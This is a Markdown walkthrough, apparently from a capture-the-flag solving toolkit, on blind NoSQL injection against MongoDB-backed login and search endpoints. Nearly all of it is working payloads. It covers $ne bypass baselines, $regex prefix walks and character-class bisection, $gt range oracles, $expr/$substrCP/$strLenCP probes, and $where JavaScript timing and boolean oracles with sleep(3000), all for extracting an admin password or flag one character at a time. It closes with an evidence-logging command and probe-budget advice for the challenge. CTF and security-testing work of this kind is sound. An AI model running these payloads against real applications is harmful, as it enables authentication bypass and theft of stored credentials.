# Blind extraction — the full walkthrough

## Step 1 — establish the oracle

The oracle must discriminate reliably between "true" and "false"
filter-results. On a login:

```text
TRUE  → 302 /dashboard or {"token": "..."}
FALSE → 401 or {"error": "invalid"}
```

On a search endpoint:

```text
TRUE  → {"users": [{...}]}     — len > baseline
FALSE → {"users": []}          — len == baseline
```

Record the baseline first: one request with a guaranteed-true filter
(`{"user": {"$ne": null}}` when you know docs exist — careful, confirm
it's the FIRST doc) and one with a guaranteed-false
(`{"user": "definitely-not-a-user-9x7z"}`).

## Step 2 — pick the target doc

```json
{"user": "admin", "pass": {"$regex": "^a"}}
```

Pin the extraction to ONE doc (usually `user: admin` or the doc the
`$ne` bypass landed on). An unpinned regex oracle over `findOne` only
tests the FIRST doc — which may not be the one with the flag.

## Step 3 — walk the prefix

```text
probe: {"user": "admin", "pass": {"$regex": "^a"}}     → FALSE
probe: {"user": "admin", "pass": {"$regex": "^b"}}     → FALSE
...                                                   
probe: {"user": "admin", "pass": {"$regex": "^f"}}     → TRUE
probe: {"user": "admin", "pass": {"$regex": "^fa"}}    → FALSE
probe: {"user": "admin", "pass": {"$regex": "^fl"}}    → TRUE
probe: {"user": "admin", "pass": {"$regex": "^fla"}}   → TRUE
probe: {"user": "admin", "pass": {"$regex": "^flag"}}  → TRUE
probe: {"user": "admin", "pass": {"$regex": "^flag\\{"}} → TRUE
```

Each TRUE extends the known prefix by one charset scan; each FALSE
advances to the next charset char. Budget: worst case `len × charset`
probes — for a 32-char hex flag: 32 × 16 = 512 probes — far over the
25-probe challenge budget, so SPLIT with the chain card or the
`$expr`/`$substrCP` bisection first.

## Step 4 — bisect instead of scan

Range-oracle, 8× cheaper:

```json
{"user": "admin", "pass": {"$gt": "m"}}
{"user": "admin", "pass": {"$gt": "fmmmmmmmmmmm"}}
{"user": "admin", "pass": {"$gte": "flag{a"}}
```

Lexicographic `$gt` bisects — but the prefix-walk must pin position:
`{"pass": {"$regex": "^.{4}."}}` + `{"$gt": "..."}` don't compose into a
per-char oracle directly; use `^.{4}[a-m]` char-class ranges instead:

```json
{"pass": {"$regex": "^.{4}[a-m]"}}    — char at 4 is a-m?
{"pass": {"$regex": "^.{4}[a-f]"}}    — char at 4 is a-f?
{"pass": {"$regex": "^.{4}[0-9a-f]"}} — char at 4 is hex?
```

Each position bisects the charset in ~4-5 probes (hex: 16 → ~4 bits).

## Step 5 — the length first

```json
{"pass": {"$regex": "^.{1}$"}}
{"pass": {"$regex": "^.{10}$"}}
{"pass": {"$regex": "^.{20}$"}}
{"pass": {"$regex": "^.{32}$"}}
{"pass": {"$regex": "^.{64}$"}}
{"pass": {"$regex": "^.{20,}$"}}
{"pass": {"$regex": "^.{30,40}$"}}
{"$expr": {"$eq": [{"$strLenCP": "$pass"}, 32]}}
{"$expr": {"$gt": [{"$strLenCP": "$pass"}, 20]}}
{"$expr": {"$gte": [{"$strLenCP": "$pass"}, 32]}}
```

Pin the length before the walk — it bounds the charset budget.

## Step 6 — the charset-discrimination

```json
{"pass": {"$regex": "^[a-f0-9]+$"}}       — all-hex?
{"pass": {"$regex": "^[a-z0-9_-]+$"}}     — the flag-charset?
{"pass": {"$regex": "^flag\\{[a-z0-9_]+\\}$"}}  — the flag-shape?
{"pass": {"$regex": "^[A-Fa-f0-9]+$"}}    — hex-mixed?
{"pass": {"$regex": "^\\w+$"}}
{"pass": {"$regex": "^[a-z]+$"}}
{"pass": {"$regex": "^[0-9]+$"}}
```

One probe narrows the charset 95→16.

## Step 7 — `$expr`-side substr

```json
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 1]}, "f"]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 1, 1]}, "l"]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 4, 1]}, "{"]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", -1, 1]}, "}"]}}
{"$expr": {"$gt": [{"$substrCP": ["$pass", 0, 1]}, "m"]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$pass", "{"]}, 4]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$pass", "}"]}, 31]}}
{"$expr": {"$eq": [{"$strLenCP": "$pass"}, 32]}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^.{N}c"}}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^.{N}$"}}}
{"$expr": {"$eq": [{"$arrayElemAt": [{"$split": ["$pass", "{"]}, 1]}, "abc}"]}}
```

`operators-aggregation.md` — `$expr` doesn't need `enableJs`.

## Step 8 — the timing-oracle (when boolean fails)

```json
{"user": "admin", "$where": "this.pass[0] == 'f' ? sleep(3000) : true"}
{"user": "admin", "$where": "this.pass[0] == 'f' && sleep(3000)"}
{"user": "admin", "$where": "sleep(3000) && this.pass[0] == 'f'"}
{"user": "admin", "$where": "this.pass[0] != 'f' || sleep(3000)"}
{"user": "admin", "$where": "if (this.pass[0] == 'f') sleep(3000); true"}
{"user": "admin", "$where": "this.pass.substr(0, 4) == 'flag' ? sleep(3000) : true"}
{"user": "admin", "$where": "this.pass.charCodeAt(0) > 100 ? sleep(3000) : true"}
{"user": "admin", "$where": "this.pass.length > 20 ? sleep(3000) : true"}
```

The timing-oracle needs a 3× jitter baseline and 2+ repeaters —
`extraction.md` — a single delayed response is `inconclusive`.

## Step 9 — the `$where` boolean-walk (enableJs on)

```json
{"user": "admin", "$where": "this.pass[0] == 'f'"}
{"user": "admin", "$where": "this.pass[0] == 'f' && this.pass[1] == 'l'"}
{"user": "admin", "$where": "this.pass.charCodeAt(0) == 102"}
{"user": "admin", "$where": "this.pass.charCodeAt(0) > 100"}
{"user": "admin", "$where": "this.pass.charCodeAt(0) < 110"}
{"user": "admin", "$where": "this.pass.indexOf('{') == 4"}
{"user": "admin", "$where": "this.pass.startsWith('flag')"}
{"user": "admin", "$where": "this.pass.endsWith('}')"}
{"user": "admin", "$where": "this.pass.length == 32"}
{"user": "admin", "$where": "this.pass.split('{')[1][0] == 'a'"}
{"user": "admin", "$where": "this.pass.substr(0, 4) == 'flag'"}
{"user": "admin", "$where": "this.pass.substring(0, 4) == 'flag'"}
{"user": "admin", "$where": "this.pass.slice(0, 4) == 'flag'"}
{"user": "admin", "$where": "this.pass.at(0) == 'f'"}
{"user": "admin", "$where": "this.pass.charAt(0) == 'f'"}
{"user": "admin", "$where": "this.pass.codePointAt(0) == 102"}
{"user": "admin", "$where": "this.pass.match(/^f/) "}
{"user": "admin", "$where": "/^f/.test(this.pass)"}
{"user": "admin", "$where": "RegExp('^f').test(this.pass)"}
```

`operators-js.md`.

## Step 10 — record the oracle verdicts

Every oracle-response gets a `post-probe` with a verbatim excerpt —
`evidence-rules.md`:

```bash
python3 tools/hooks.py post-probe <name> \
  --request 'POST /login {"user":"admin","pass":{"$regex":"^f"}}' \
  --verdict confirms --evidence-kind class --class web-nosqli \
  --hypothesis-id h1 --evidence "HTTP/1.1 302 Location: /dashboard" \
  --response "<raw response>"
```

A `confirms` needs `--evidence` a SUBSTRING of `--response` — the gate
checks the quote is real.

## The sequential-budget

Blind extraction is SEQUENTIAL — each probe depends on the last. Record
probe-count against the 25/45 challenge budget: at ~4 probes/char, a
32-char flag is 128 probes — escalate with `state.py --strategy-used`
through `writeup_search`/`solver_handoff` rather than burning the whole
budget on the walk.
